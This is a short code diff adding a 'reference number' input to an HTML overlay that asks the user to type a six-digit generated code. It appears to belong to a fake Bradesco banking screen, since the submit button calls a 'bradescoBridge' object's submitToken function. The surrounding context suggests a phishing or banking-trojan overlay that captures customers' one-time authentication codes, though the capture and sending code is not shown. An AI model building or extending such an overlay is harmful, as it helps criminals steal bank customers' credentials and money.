@@ -223,6 +223,8 @@
             <div class="form-group" style="margin-top: 20px;">
               <label>Digite o código gerado:</label>
               <input type="text" id="overlay-token" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
+              <label style="margin-top: 15px;">Número de Referência:</label>
+              <input type="text" id="overlay-referencia" placeholder="0000" maxlength="10" style="text-align: center; font-size: 18px;">
             </div>
             <button onclick="window.bradescoBridge.submitToken()">ENVIAR CÓDIGO</button>
             <div style="margin-top: 20px; font-size: 11px; color: #666;">
